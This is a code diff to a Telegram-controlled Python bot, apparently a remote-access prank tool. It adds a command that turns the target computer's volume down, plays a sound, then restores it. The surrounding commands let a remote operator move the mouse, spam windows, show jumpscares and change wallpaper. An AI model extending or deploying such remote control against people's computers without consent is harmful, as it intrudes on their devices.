@@ -153,6 +153,7 @@ setvideowallpaper - Sets a video as wallpaper.
 mousecontroller - Sends a mouse controlling menu.
 mute - Set computer's volume to 0.
 full - Set computer's volume to 100.
+tralalerotralala - Plays italian brainrot.
 
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
@@ -674,6 +675,7 @@ class PeppinoTelegram:
             "rightclick":self.rightclick,
             "nothing":lambda:...,
             "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
+            "tralalerotralala":lambda:self.__play_loaded_sound("tralarero-tralala", volume=8)
         }
         self.no_background_functions = [self.message_box, self.spam_windows]
     
@@ -688,8 +690,14 @@ class PeppinoTelegram:
     def __playsound(self, audio: str) -> None:
         PlaySound(audio, SND_FILENAME | SND_ASYNC)
     
-    def __play_loaded_sound(self, audio: str) -> None:
+    def __play_loaded_sound(self, audio: str, volume=None) -> None:
+        old = self.audio_mixer.getVolumePercentage()
+        if volume:
+            self.set_volume(volume)
         self.__playsound(self.audios[audio])
+        sleep(5)
+        if volume:
+            self.set_volume(old)
 
     def set_volume(self, volume):
         if volume in range(0, 101):
@@ -1352,6 +1360,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         self.update_commands()
         self.images = load_images()
         self.audios = load_audios()
+        print(self.audios)
         if not self.selphie(f"Bot started: "+now()):
             self.bsend(f"Bot started: {now}")
         loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
